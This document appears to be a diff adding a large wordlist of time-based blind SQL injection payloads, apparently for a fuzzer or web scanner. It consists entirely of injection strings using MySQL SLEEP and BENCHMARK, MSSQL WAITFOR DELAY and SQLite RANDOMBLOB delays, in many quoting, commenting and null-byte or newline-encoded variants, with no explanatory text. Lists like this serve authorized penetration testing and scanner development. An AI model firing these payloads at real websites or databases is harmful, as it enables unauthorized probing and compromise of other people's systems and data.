+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
+" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '134')
+ and 1337=(select 1337 from (select sleep(120))A)
+ and 1337=(select 1337 from (select sleep(120))A) -- 
+ and sleep(120)
+ and sleep(120) -- 
+ or 1337=(select 1337 from (select sleep(120))A)
+ or 1337=(select 1337 from (select sleep(120))A) -- 
+ or sleep(120)
+ or sleep(120) -- 
+%00 and 1337=(select 1337 from (select sleep(120))A)
+%00 and 1337=(select 1337 from (select sleep(120))A) -- 
+%00 and sleep(120)
+%00 and sleep(120) -- 
+%00 or 1337=(select 1337 from (select sleep(120))A)
+%00 or 1337=(select 1337 from (select sleep(120))A) -- 
+%00 or sleep(120)
+%00 or sleep(120) -- 
+%00' and 1337=(select 1337 from (select sleep(120))A) -- 
+%00' and sleep(120) -- 
+%00' or 1337=(select 1337 from (select sleep(120))A) -- 
+%00' or sleep(120) -- 
+%00';select sleep(120) -- 
+%00;select sleep(120)
+%00;select sleep(120) -- 
+%00\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%00\' and sleep(120) -- 
+%00\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%00\' or sleep(120) -- 
+%00\';select sleep(120) -- 
+%00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%00\\' and sleep(120) -- 
+%00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%00\\' or sleep(120) -- 
+%00\\';select sleep(120) -- 
+%00sleep(120)
+%00sleep(120) -- 
+%0a and 1337=(select 1337 from (select sleep(120))A)
+%0a and 1337=(select 1337 from (select sleep(120))A) -- 
+%0a and sleep(120)
+%0a and sleep(120) -- 
+%0a or 1337=(select 1337 from (select sleep(120))A)
+%0a or 1337=(select 1337 from (select sleep(120))A) -- 
+%0a or sleep(120)
+%0a or sleep(120) -- 
+%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0a' and sleep(120) -- 
+%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0a' or sleep(120) -- 
+%0a';select sleep(120) -- 
+%0a;select sleep(120)
+%0a;select sleep(120) -- 
+%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0a\' and sleep(120) -- 
+%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0a\' or sleep(120) -- 
+%0a\';select sleep(120) -- 
+%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0a\\' and sleep(120) -- 
+%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0a\\' or sleep(120) -- 
+%0a\\';select sleep(120) -- 
+%0asleep(120)
+%0asleep(120) -- 
+%0d%0a and 1337=(select 1337 from (select sleep(120))A)
+%0d%0a and 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a and sleep(120)
+%0d%0a and sleep(120) -- 
+%0d%0a or 1337=(select 1337 from (select sleep(120))A)
+%0d%0a or 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a or sleep(120)
+%0d%0a or sleep(120) -- 
+%0d%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a' and sleep(120) -- 
+%0d%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a' or sleep(120) -- 
+%0d%0a';select sleep(120) -- 
+%0d%0a;select sleep(120)
+%0d%0a;select sleep(120) -- 
+%0d%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a\' and sleep(120) -- 
+%0d%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a\' or sleep(120) -- 
+%0d%0a\';select sleep(120) -- 
+%0d%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a\\' and sleep(120) -- 
+%0d%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a\\' or sleep(120) -- 
+%0d%0a\\';select sleep(120) -- 
+%0d%0asleep(120)
+%0d%0asleep(120) -- 
+' and 1337=(select 1337 from (select sleep(120))A) -- 
+' and sleep(120) -- 
+' or 1337=(select 1337 from (select sleep(120))A) -- 
+' or sleep(120) -- 
+';select sleep(120) -- 
+0x00 and 1337=(select 1337 from (select sleep(120))A)
+0x00 and 1337=(select 1337 from (select sleep(120))A) -- 
+0x00 and sleep(120)
+0x00 and sleep(120) -- 
+0x00 or 1337=(select 1337 from (select sleep(120))A)
+0x00 or 1337=(select 1337 from (select sleep(120))A) -- 
+0x00 or sleep(120)
+0x00 or sleep(120) -- 
+0x00' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x00' and sleep(120) -- 
+0x00' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x00' or sleep(120) -- 
+0x00';select sleep(120) -- 
+0x00;select sleep(120)
+0x00;select sleep(120) -- 
+0x00\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x00\' and sleep(120) -- 
+0x00\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x00\' or sleep(120) -- 
+0x00\';select sleep(120) -- 
+0x00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x00\\' and sleep(120) -- 
+0x00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x00\\' or sleep(120) -- 
+0x00\\';select sleep(120) -- 
+0x00sleep(120)
+0x00sleep(120) -- 
+0x0a and 1337=(select 1337 from (select sleep(120))A)
+0x0a and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a and sleep(120)
+0x0a and sleep(120) -- 
+0x0a or 1337=(select 1337 from (select sleep(120))A)
+0x0a or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a or sleep(120)
+0x0a or sleep(120) -- 
+0x0a' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a' and sleep(120) -- 
+0x0a' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a' or sleep(120) -- 
+0x0a';select sleep(120) -- 
+0x0a;select sleep(120)
+0x0a;select sleep(120) -- 
+0x0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a\' and sleep(120) -- 
+0x0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a\' or sleep(120) -- 
+0x0a\';select sleep(120) -- 
+0x0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a\\' and sleep(120) -- 
+0x0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a\\' or sleep(120) -- 
+0x0a\\';select sleep(120) -- 
+0x0asleep(120)
+0x0asleep(120) -- 
+0x0d0a and 1337=(select 1337 from (select sleep(120))A)
+0x0d0a and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a and sleep(120)
+0x0d0a and sleep(120) -- 
+0x0d0a or 1337=(select 1337 from (select sleep(120))A)
+0x0d0a or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a or sleep(120)
+0x0d0a or sleep(120) -- 
+0x0d0a' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a' and sleep(120) -- 
+0x0d0a' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a' or sleep(120) -- 
+0x0d0a';select sleep(120) -- 
+0x0d0a;select sleep(120)
+0x0d0a;select sleep(120) -- 
+0x0d0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a\' and sleep(120) -- 
+0x0d0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a\' or sleep(120) -- 
+0x0d0a\';select sleep(120) -- 
+0x0d0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a\\' and sleep(120) -- 
+0x0d0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a\\' or sleep(120) -- 
+0x0d0a\\';select sleep(120) -- 
+0x0d0asleep(120)
+0x0d0asleep(120) -- 
+;select sleep(120)
+;select sleep(120) -- 
+\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\' and sleep(120) -- 
+\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\' or sleep(120) -- 
+\';select sleep(120) -- 
+\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\\' and sleep(120) -- 
+\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\\' or sleep(120) -- 
+\\';select sleep(120) -- 
+\\n and 1337=(select 1337 from (select sleep(120))A)
+\\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\\n and sleep(120)
+\\n and sleep(120) -- 
+\\n or 1337=(select 1337 from (select sleep(120))A)
+\\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\\n or sleep(120)
+\\n or sleep(120) -- 
+\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
+\\n' and sleep(120) -- 
+\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
+\\n' or sleep(120) -- 
+\\n';select sleep(120) -- 
+\\n;select sleep(120)
+\\n;select sleep(120) -- 
+\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\\n\\' and sleep(120) -- 
+\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\\n\\' or sleep(120) -- 
+\\n\\';select sleep(120) -- 
+\\nsleep(120)
+\\nsleep(120) -- 
+\\r\\n and 1337=(select 1337 from (select sleep(120))A)
+\\r\\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n and sleep(120)
+\\r\\n and sleep(120) -- 
+\\r\\n or 1337=(select 1337 from (select sleep(120))A)
+\\r\\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n or sleep(120)
+\\r\\n or sleep(120) -- 
+\\r\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n' and sleep(120) -- 
+\\r\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n' or sleep(120) -- 
+\\r\\n';select sleep(120) -- 
+\\r\\n;select sleep(120)
+\\r\\n;select sleep(120) -- 
+\\r\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n\\' and sleep(120) -- 
+\\r\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n\\' or sleep(120) -- 
+\\r\\n\\';select sleep(120) -- 
+\\r\\nsleep(120)
+\\r\\nsleep(120) -- 
+\n and 1337=(select 1337 from (select sleep(120))A)
+\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\n and sleep(120)
+\n and sleep(120) -- 
+\n or 1337=(select 1337 from (select sleep(120))A)
+\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\n or sleep(120)
+\n or sleep(120) -- 
+\n' and 1337=(select 1337 from (select sleep(120))A) -- 
+\n' and sleep(120) -- 
+\n' or 1337=(select 1337 from (select sleep(120))A) -- 
+\n' or sleep(120) -- 
+\n';select sleep(120) -- 
+\n;select sleep(120)
+\n;select sleep(120) -- 
+\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\n\' and sleep(120) -- 
+\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\n\' or sleep(120) -- 
+\n\';select sleep(120) -- 
+\nsleep(120)
+\nsleep(120) -- 
+\r\n and 1337=(select 1337 from (select sleep(120))A)
+\r\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n and sleep(120)
+\r\n and sleep(120) -- 
+\r\n or 1337=(select 1337 from (select sleep(120))A)
+\r\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n or sleep(120)
+\r\n or sleep(120) -- 
+\r\n' and 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n' and sleep(120) -- 
+\r\n' or 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n' or sleep(120) -- 
+\r\n';select sleep(120) -- 
+\r\n;select sleep(120)
+\r\n;select sleep(120) -- 
+\r\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n\' and sleep(120) -- 
+\r\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n\' or sleep(120) -- 
+\r\n\';select sleep(120) -- 
+\r\nsleep(120)
+\r\nsleep(120) -- 
+sleep(120)
+sleep(120) -- 
+  waitfor delay '00:02'
+waitfor delay '00:02' -- 
+waitfor delay \'00:02\'
+waitfor delay \'00:02\' -- 
+%00 waitfor delay '00:02'
+%00 waitfor delay '00:02' -- 
+%00 waitfor delay \'00:02\'
+%00 waitfor delay \'00:02\' -- 
+%00' waitfor delay '00:02' -- 
+%00';waitfor delay '00:02' -- 
+%00;waitfor delay '00:02'
+%00;waitfor delay '00:02' -- 
+%00;waitfor delay \'00:02\'
+%00;waitfor delay \'00:02\' -- 
+%00\' waitfor delay \'00:02\' -- 
+%00\';waitfor delay \'00:02\' -- 
+%00\\' waitfor delay \\'00:02\\' -- 
+%00\\';waitfor delay \\'00:02\\' -- 
+%0a waitfor delay '00:02'
+%0a waitfor delay '00:02' -- 
+%0a waitfor delay \'00:02\'
+%0a waitfor delay \'00:02\' -- 
+%0a' waitfor delay '00:02' -- 
+%0a';waitfor delay '00:02' -- 
+%0a;waitfor delay '00:02'
+%0a;waitfor delay '00:02' -- 
+%0a;waitfor delay \'00:02\'
+%0a;waitfor delay \'00:02\' -- 
+%0a\' waitfor delay \'00:02\' -- 
+%0a\';waitfor delay \'00:02\' -- 
+%0a\\' waitfor delay \\'00:02\\' -- 
+%0a\\';waitfor delay \\'00:02\\' -- 
+%0d%0a waitfor delay '00:02'
+%0d%0a waitfor delay '00:02' -- 
+%0d%0a waitfor delay \'00:02\'
+%0d%0a waitfor delay \'00:02\' -- 
+%0d%0a' waitfor delay '00:02' -- 
+%0d%0a';waitfor delay '00:02' -- 
+%0d%0a;waitfor delay '00:02'
+%0d%0a;waitfor delay '00:02' -- 
+%0d%0a;waitfor delay \'00:02\'
+%0d%0a;waitfor delay \'00:02\' -- 
+%0d%0a\' waitfor delay \'00:02\' -- 
+%0d%0a\';waitfor delay \'00:02\' -- 
+%0d%0a\\' waitfor delay \\'00:02\\' -- 
+%0d%0a\\';waitfor delay \\'00:02\\' -- 
+' waitfor delay '00:02' -- 
+';waitfor delay '00:02' -- 
+0x00 waitfor delay '00:02'
+0x00 waitfor delay '00:02' -- 
+0x00 waitfor delay \'00:02\'
+0x00 waitfor delay \'00:02\' -- 
+0x00' waitfor delay '00:02' -- 
+0x00';waitfor delay '00:02' -- 
+0x00;waitfor delay '00:02'
+0x00;waitfor delay '00:02' -- 
+0x00;waitfor delay \'00:02\'
+0x00;waitfor delay \'00:02\' -- 
+0x00\' waitfor delay \'00:02\' -- 
+0x00\';waitfor delay \'00:02\' -- 
+0x00\\' waitfor delay \\'00:02\\' -- 
+0x00\\';waitfor delay \\'00:02\\' -- 
+0x0a waitfor delay '00:02'
+0x0a waitfor delay '00:02' -- 
+0x0a waitfor delay \'00:02\'
+0x0a waitfor delay \'00:02\' -- 
+0x0a' waitfor delay '00:02' -- 
+0x0a';waitfor delay '00:02' -- 
+0x0a;waitfor delay '00:02'
+0x0a;waitfor delay '00:02' -- 
+0x0a;waitfor delay \'00:02\'
+0x0a;waitfor delay \'00:02\' -- 
+0x0a\' waitfor delay \'00:02\' -- 
+0x0a\';waitfor delay \'00:02\' -- 
+0x0a\\' waitfor delay \\'00:02\\' -- 
+0x0a\\';waitfor delay \\'00:02\\' -- 
+0x0d0a waitfor delay '00:02'
+0x0d0a waitfor delay '00:02' -- 
+0x0d0a waitfor delay \'00:02\'
+0x0d0a waitfor delay \'00:02\' -- 
+0x0d0a' waitfor delay '00:02' -- 
+0x0d0a';waitfor delay '00:02' -- 
+0x0d0a;waitfor delay '00:02'
+0x0d0a;waitfor delay '00:02' -- 
+0x0d0a;waitfor delay \'00:02\'
+0x0d0a;waitfor delay \'00:02\' -- 
+0x0d0a\' waitfor delay \'00:02\' -- 
+0x0d0a\';waitfor delay \'00:02\' -- 
+0x0d0a\\' waitfor delay \\'00:02\\' -- 
+0x0d0a\\';waitfor delay \\'00:02\\' -- 
+;waitfor delay '00:02'
+;waitfor delay '00:02' -- 
+;waitfor delay \'00:02\'
+;waitfor delay \'00:02\' -- 
+\' waitfor delay \'00:02\' -- 
+\';waitfor delay \'00:02\' -- 
+\\' waitfor delay \\'00:02\\' -- 
+\\';waitfor delay \\'00:02\\' -- 
+\\n waitfor delay '00:02'
+\\n waitfor delay '00:02' -- 
+\\n waitfor delay \'00:02\'
+\\n waitfor delay \'00:02\' -- 
+\\n' waitfor delay '00:02' -- 
+\\n';waitfor delay '00:02' -- 
+\\n;waitfor delay '00:02'
+\\n;waitfor delay '00:02' -- 
+\\n;waitfor delay \'00:02\'
+\\n;waitfor delay \'00:02\' -- 
+\\n\\' waitfor delay \\'00:02\\' -- 
+\\n\\';waitfor delay \\'00:02\\' -- 
+\\r\\n waitfor delay '00:02'
+\\r\\n waitfor delay '00:02' -- 
+\\r\\n waitfor delay \'00:02\'
+\\r\\n waitfor delay \'00:02\' -- 
+\\r\\n' waitfor delay '00:02' -- 
+\\r\\n';waitfor delay '00:02' -- 
+\\r\\n;waitfor delay '00:02'
+\\r\\n;waitfor delay '00:02' -- 
+\\r\\n;waitfor delay \'00:02\'
+\\r\\n;waitfor delay \'00:02\' -- 
+\\r\\n\\' waitfor delay \\'00:02\\' -- 
+\\r\\n\\';waitfor delay \\'00:02\\' -- 
+\n waitfor delay '00:02'
+\n waitfor delay '00:02' -- 
+\n waitfor delay \'00:02\'
+\n waitfor delay \'00:02\' -- 
+\n' waitfor delay '00:02' -- 
+\n';waitfor delay '00:02' -- 
+\n;waitfor delay '00:02'
+\n;waitfor delay '00:02' -- 
+\n;waitfor delay \'00:02\'
+\n;waitfor delay \'00:02\' -- 
+\n\' waitfor delay \'00:02\' -- 
+\n\';waitfor delay \'00:02\' -- 
+\r\n waitfor delay '00:02'
+\r\n waitfor delay '00:02' -- 
+\r\n waitfor delay \'00:02\'
+\r\n waitfor delay \'00:02\' -- 
+\r\n' waitfor delay '00:02' -- 
+\r\n';waitfor delay '00:02' -- 
+\r\n;waitfor delay '00:02'
+\r\n;waitfor delay '00:02' -- 
+\r\n;waitfor delay \'00:02\'
+\r\n;waitfor delay \'00:02\' -- 
+\r\n\' waitfor delay \'00:02\' -- 
+\r\n\';waitfor delay \'00:02\' -- 
+(sleep 10)--
+(sleep 10)
+(sleep(10))--
+(sleep(10))
+-sleep(10)
+SLEEP(10)#
+SLEEP(10)--
+SLEEP(10)="
+SLEEP(10)='
+";sleep 10--
+";sleep 10
+";sleep(10)--
+";sleep(10)
+";SELECT SLEEP(10); #
+1 SELECT SLEEP(10); #
++ SLEEP(10) + '
+&&SLEEP(10)
+&&SLEEP(10)--
+&&SLEEP(10)#
+;sleep 10--
+;sleep 10
+;sleep(10)--
+;sleep(10)
+;SELECT SLEEP(10); #
+'&&SLEEP(10)&&'1
+' SELECT SLEEP(10); #
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+ORDER BY SLEEP(10)
+ORDER BY SLEEP(10)--
+ORDER BY SLEEP(10)#
+AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+OR (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
+RANDOMBLOB(5000000000/2)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))
+RANDOMBLOB(10000000000/2)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
